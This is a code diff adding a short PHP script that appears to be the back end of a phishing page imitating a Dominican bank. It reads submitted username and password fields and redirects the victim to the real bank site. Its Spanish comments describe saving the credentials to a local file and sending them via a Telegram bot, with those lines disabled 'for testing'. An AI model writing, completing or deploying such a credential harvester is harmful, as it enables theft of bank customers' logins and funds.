@@ -1,0 +1,16 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $user = $_POST["user"];
+    $pass = $_POST["pass"];
+
+    // (Opcional) Guardar en un archivo local para pruebas
+    // file_put_contents("creds.txt", "User: $user - Pass: $pass\n", FILE_APPEND);
+
+    // Desactivamos el envío a Telegram para pruebas
+    // $botToken = "..." ; // comentado
+
+    // Redirige a una página de "éxito" o al sitio real
+    header("Location: https://www.bdcbank.com.do/"); // Pon la URL real del banco si la conoces
+    exit;
+}
+?>
